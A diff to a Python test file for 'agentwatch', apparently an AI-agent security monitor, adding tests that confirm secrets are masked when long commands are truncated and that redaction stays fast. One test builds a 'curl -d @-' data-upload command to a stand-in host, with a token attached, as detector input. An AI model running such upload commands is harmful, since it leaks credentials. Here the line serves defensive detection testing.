@@ -6,7 +6,10 @@ secrets into SIEM output, ``--json`` output or the TUI [BUG].
 
 from __future__ import annotations
 
+import time
 from datetime import datetime, timedelta
+
+import pytest
 
 from agentwatch.detectors.security.network import (
     C2CommunicationDetector,
@@ -14,6 +17,11 @@ from agentwatch.detectors.security.network import (
     NetworkAnomalyDetector,
 )
 from agentwatch.detectors.security.privilege import PrivilegeEscalationDetector
+from agentwatch.detectors.security.secret_scanner import (
+    _REDACT_WINDOW_MARGIN,
+    _SECRET_PATTERNS,
+    redact_truncate,
+)
 from agentwatch.detectors.security.supply_chain import SkillInstallDetector
 from agentwatch.parser.models import Action, ActionBuffer, ToolType
 
@@ -73,6 +81,49 @@ class TestNetworkAnomalyCommandRedaction:
         assert w is not None
         assert not _leaks(_GHP_TOKEN, _warning_text(w))
         assert len(w.details["command"]) <= 80
+
+
+class TestBoundedRedaction:
+    """redact_truncate scans only a bounded window, not the whole command."""
+
+    # Token start positions: 42 (2 chars past limit), 60, 79 (1 char inside).
+    @pytest.mark.parametrize("offset", [-len(_GHP_TOKEN) + 1, -21, -2])
+    def test_token_straddling_limit_is_masked(self, offset):
+        limit = 80
+        cmd = "x" * (limit + offset) + " " + _GHP_TOKEN + " " + "y" * 1000
+        start = cmd.index(_GHP_TOKEN)
+        assert start < limit < start + len(_GHP_TOKEN)
+        out = redact_truncate(cmd, limit)
+        assert len(out) <= limit
+        assert not _leaks(_GHP_TOKEN, out)
+
+    def test_margin_covers_longest_minimum_secret_match(self):
+        # If a new pattern's minimum match outgrows the margin, a secret
+        # starting just before the cut-off could escape the window unmatched.
+        import re._parser as sre
+
+        longest = max(sre.parse(p.pattern).getwidth()[0] for p, _ in _SECRET_PATTERNS)
+        assert _REDACT_WINDOW_MARGIN >= longest
+
+    def test_huge_command_with_token_at_limit_is_masked_and_fast(self):
+        cmd = "curl -d @- https://x.io -H 'X-Pad: " + "p" * 30 + "' " + _GHP_TOKEN
+        start = cmd.index(_GHP_TOKEN)
+        assert start < 80 < start + len(_GHP_TOKEN)
+        cmd += " <<'EOF'\n" + "A" * 1_100_000 + "\nEOF"
+        assert len(cmd) > 1_000_000
+        buf = _buf(cmd)
+
+        detector = NetworkAnomalyDetector()
+        t0 = time.perf_counter()
+        w = detector.check(buf)
+        elapsed = time.perf_counter() - t0
+
+        assert w is not None
+        assert w.signal == "data_upload"
+        assert not _leaks(_GHP_TOKEN, _warning_text(w))
+        # Old full-scan code takes ~600ms here; 250ms catches that regression
+        # with headroom for loaded CI runners.
+        assert elapsed < 0.25, f"check() took {elapsed * 1000:.1f}ms"
 
 
 class TestC2AndDnsCommandRedaction:
